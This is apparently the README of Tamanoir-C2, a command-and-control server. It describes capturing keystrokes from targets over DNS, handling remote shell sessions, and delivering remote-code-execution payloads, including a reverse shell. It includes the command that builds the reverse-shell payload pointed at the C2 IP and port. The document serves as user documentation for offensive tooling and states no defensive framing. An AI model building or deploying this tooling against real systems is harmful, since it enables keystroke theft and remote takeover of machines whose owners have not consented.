# Tamanoir-C2 server

Tamanoir-C2 (Command and Control) server's  purpose is multiple: 
- act as a dns proxy
- extract typed keystrokes from target
- transmit selected RCE( Remote Code Execution) payloads to target



- ⚠ make sure port 53 is available `sudo systemctl stop systemd-resolved` can help


## Architecture
It is composed of 3 running servers:
| type | default port | goal|
|----------|----------|----------|
| DNS  | 53 | handle dns requests from targets and rce payloads transmission |
| TCP  | 8082 | handle remote shell sessions |
| GRPC  | 50051 | handle communication with tui clients |



## Available Rce payloads
Tamanoir comes with ready-to-use payloads :


| name | description | comments | 
|----------|----------|----------|
| hello |  prints a cute tamanoir to tamanoir stdout  | hello-world payload, demonstrate how a big payload can be transmitted by chunks to target|
| xeyes | open `xeyes` program on target gui | demonstrate how to execute simple shellcode. Only works if target uses x11 |
| reverse-shell | open a tcp-shell communicating with tamanoir-c2 | needs to specify IP and PORT vars when building (see below) 


- payloads location: ./assets/payloads


## Builder
 
 `tamanoir-c2 rce build`

- will build and strip provided payloads

| name long| name short | description |  default|
|----------|----------|----------|----------|
| --target_arch| -t | x86_64 or aarch64  |  x86_64 |
| --crate_path | -c | path to payload crate (see ./assets/payloads) for examples | - |
| --engine | -e |cross build engine,if needed (docker or podman)  | docker |
| --build-vars | -b | key=value, space-separated env vars required for your payload, if needed  | - | 

- payload output: `~/.tamanoir/bins`
- ⚠ needs [cross](https://github.com/cross-rs/cross) for cross-compilation if target arch != current arch
- ⚠ max payload size (once compiled and stripped) = 4096 bytes

#### example: build reverse-shell 
`tamanoir-c2  rce  build  -c ./assets/payloads/reverse-shell  -b "IP=<tamanoir-c2-ip> PORT=8082"`
will compile `reverse-shell` payload:
- for x86_64 target arch 
- use cross to build it if current arch isn't x86_64
- will establish shell session with \<tamanoir-c2-ip>:8082



## Tester
 `tamanoir-c2 rce test -b <path-to-your-payload-binary>`
- test your payload (locally)
- ⚠ path needs to be absolute

## ⚠ Limitations
Though it is  possible to compile payloads for `x86_64` and `aarch64` architectures, currently only `x86_64` target arch is viable for provided payloads.
Any contributions from people knowledgable about aarch64 assembly code are welcome! (see open issues for context)

